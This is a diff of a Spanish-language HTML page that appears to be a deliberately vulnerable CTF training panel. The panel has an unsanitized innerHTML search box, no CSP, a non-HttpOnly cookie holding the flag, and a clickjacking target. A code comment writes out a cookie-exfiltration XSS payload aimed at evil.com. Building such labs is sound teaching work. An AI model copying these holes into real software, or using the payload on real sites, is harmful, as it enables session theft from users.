@@ -2,20 +2,223 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>Panel de Administración Ultra Seguro</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Panel de Control - Administración</title>
+    <!-- 🔴 VULNERABILIDAD: Falta CSP → Permite XSS, inyección de scripts maliciosos -->
+    <!-- Header que debería existir: 
+         Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; 
+    -->
     <style>
-        body { font-family: sans-serif; text-align: center; padding-top: 50px; }
-        .btn-danger { background: red; color: white; padding: 15px; border: none; cursor: pointer; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f7f6;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .card {
+            background: white;
+            padding: 2rem;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            text-align: center;
+            width: 100%;
+            max-width: 450px;
+        }
+        h1 { color: #333; font-size: 1.5rem; margin-bottom: 1rem; }
+        .status { color: #27ae60; font-weight: bold; margin-bottom: 2rem; }
+        .btn-danger {
+            background-color: #e74c3c;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1rem;
+            transition: background 0.3s;
+            margin: 10px 0;
+        }
+        .btn-danger:hover { background-color: #c0392b; }
+        .btn-secondary {
+            background-color: #3498db;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            margin: 5px;
+        }
+        .btn-secondary:hover { background-color: #2980b9; }
+        
+        .overlay-test { color: #ccc; font-size: 0.8rem; margin-top: 20px; }
+        .security-note { 
+            background: #fff3cd; 
+            padding: 10px; 
+            border-radius: 5px; 
+            margin-top: 15px;
+            font-size: 0.85rem;
+            border-left: 4px solid #ffc107;
+        }
+        
+        /* === NUEVO: Panel de vulnerabilidades === */
+        .vuln-panel {
+            background: #ffebee;
+            border: 1px solid #ffcdd2;
+            border-radius: 8px;
+            padding: 12px;
+            margin: 15px 0;
+            text-align: left;
+            font-size: 0.8rem;
+        }
+        .vuln-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 4px 0;
+            color: #c62828;
+        }
+        .vuln-item.fixed {
+            color: #2e7d32;
+            text-decoration: line-through;
+            opacity: 0.7;
+        }
+        .vuln-icon { font-weight: bold; }
+        
+        /* Input para demo de XSS */
+        .search-box {
+            width: 100%;
+            padding: 10px;
+            margin: 15px 0;
+            border: 2px solid #ddd;
+            border-radius: 5px;
+            font-size: 1rem;
+        }
+        .search-box:focus {
+            outline: none;
+            border-color: #3498db;
+        }
     </style>
 </head>
 <body>
-    <h1>Bienvenido, Administrador</h1>
-    <p>Estado de la sesión: <b>Activa</b></p>
-    <button class="btn-danger" onclick="alert('¡Acción realizada en la cuenta!')">ELIMINAR MI CUENTA</button>
+
+    <div class="card">
+        <h1>🔐 Panel Admin</h1>
+        <p>Estado: <span class="status">● Activa</span></p>
+        
+        <!-- === NUEVO: Buscador vulnerable a XSS === -->
+        <input type="text" id="searchInput" class="search-box" placeholder="🔍 Buscar usuario...">
+        <button class="btn-secondary" onclick="buscarUsuario()">Buscar</button>
+        <div id="searchResult" style="min-height: 20px; margin: 10px 0; color: #666;"></div>
+        
+        <!-- Botón principal (Clickjacking target) -->
+        <button class="btn-danger" id="actionBtn">⚠️ ELIMINAR MI CUENTA</button>
+        
+        <div class="overlay-test">ID Nodo: 0x88234-AD</div>
+        
+        <!-- === Panel educativo de vulnerabilidades === -->
+        <div class="vuln-panel">
+            <strong>🔓 Cabeceras FALTANTES (Retos):</strong>
+            <div class="vuln-item"><span class="vuln-icon">❌</span> X-Frame-Options → Clickjacking</div>
+            <div class="vuln-item"><span class="vuln-icon">❌</span> X-Content-Type-Options → MIME Sniffing</div>
+            <div class="vuln-item"><span class="vuln-icon">❌</span> <strong>Content-Security-Policy → XSS</strong> ⭐ NUEVO</div>
+            <div class="vuln-item"><span class="vuln-icon">❌</span> Cookie sin HttpOnly → Robo de sesión</div>
+            <div class="vuln-item"><span class="vuln-icon">❌</span> Cache-Control → Datos en caché público</div>
+        </div>
+        
+        <div class="security-note">
+            🎯 <strong>Reto CTF:</strong> Inyecta <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code> en el buscador.<br>
+            💡 Si ejecuta código → ¡Encontraste la vulnerabilidad CSP!
+        </div>
+    </div>
 
     <script>
+        /**
+         * ============================================
+         * PANEL CTF - RETOS DE SEGURIDAD (v2.0)
+         * ============================================
+         * Vulnerabilidades demostradas:
+         * 🔴 1. Clickjacking (sin X-Frame-Options)
+         * 🔴 2. MIME Sniffing (sin X-Content-Type-Options) 
+         * 🔴 3. XSS via CSP ausente ← ¡NUEVO RETO!
+         * 🔴 4. Cookie sin HttpOnly
+         * 🔴 5. Cache sensible sin controles
+         */
+
+        // === RETO XOR: Bandera cifrada ===
+        const _0xdata = [38, 44, 33, 39, 59, 35, 44, 41, 35, 43, 63, 42, 33, 35, 43, 59, 33, 46, 36, 59, 51, 52, 37, 33, 44, 31, 63, 18, 16, 24, 20, 5];
+        const _0xkey = 72;
+
+        function decryptFlag(data, key) {
+            return data.map(byte => String.fromCharCode(byte ^ key)).join('');
+        }
+
+        // === RETO XSS: Buscador vulnerable (sin sanitización + sin CSP) ===
+        function buscarUsuario() {
+            const input = document.getElementById('searchInput').value;
+            const result = document.getElementById('searchResult');
+            
+            // 🔴 VULNERABILIDAD: Inserción directa sin escapar + sin CSP que lo bloquee
+            // Un atacante podría inyectar: <script>fetch('https://evil.com?c='+document.cookie)</script>
+            result.innerHTML = `🔎 Resultados para: <strong>${input}</strong>`;
+            
+            // Bonus: Si el input contiene <script>, se ejecutará (porque no hay CSP)
+            if (input.includes('<script')) {
+                console.log("🎯 ¡XSS detectado! Sin CSP, el navegador ejecutó tu script.");
+            }
+        }
+
+        // Permitir Enter en el buscador
+        document.getElementById('searchInput').addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') buscarUsuario();
+        });
+
+        // === RETO MIME Sniffing ===
+        function cargarAvatar() {
+            const fakeImage = document.createElement('script');
+            fakeImage.src = "data:text/javascript,console.log('🎯 MIME_SNIFFED'); alert('MIME Sniffing: código ejecutado desde falsa imagen');";
+            document.body.appendChild(fakeImage);
+        }
+
+        // === Inicialización vulnerable ===
+        function initSession() {
+            const flag = decryptFlag(_0xdata, _0xkey);
+            
+            // 🔴 Cookie vulnerable: sin HttpOnly, sin Secure, SameSite=Lax
+            document.cookie = `session_token=${flag}; path=/; SameSite=Lax`;
+            
+            console.log("%c [🔐 CTF] Sistema cargado. 5 vulnerabilidades activas.", "color: #e74c3c; font-weight: bold;");
+            console.log(`[💡 PISTA 1] Bandera en cookie: ${flag}`);
+            console.log(`[💡 PISTA 2] Prueba XSS: <script>alert(1)</script> en el buscador`);
+            console.log(`[💡 PISTA 3] Sin CSP, cualquier inline-script se ejecuta 🎯`);
+        }
+
+        // === Event: Botón eliminar (Clickjacking target) ===
+        document.getElementById('actionBtn').addEventListener('click', () => {
+            alert("⚠️ ACCIÓN CRÍTICA\n\n¿Estás viendo esto dentro de un <iframe> transparente?\n→ ¡CLICKJACKING EXITOSO!\n\n🔐 Sin X-Frame-Options, cualquier sitio puede embeberte.");
+        });
+
+        // Activar MIME Sniffing al hover (una vez)
+        document.getElementById('actionBtn').addEventListener('mouseover', cargarAvatar, { once: true });
+
+        // === DEMO: Cómo se VERÍA con CSP activado (comentado para referencia) ===
+        /*
+        // Si el servidor enviara esta cabecera:
+        // Content-Security-Policy: default-src 'self'; script-src 'self';
         
-        document.cookie = "session_token=FLAG{CLICK_JACK_CSACON}; path=/";
+        // Entonces este script inline NO se ejecutaría:
+        // <script>alert('XSS blocked by CSP!')</script>
+        
+        // Y el buscador debería usar textContent en lugar de innerHTML:
+        // result.textContent = `Resultados para: ${input}`; // ✅ Seguro
+        */
+
+        // Iniciar
+        window.addEventListener('DOMContentLoaded', initSession);
     </script>
 </body>
 </html>
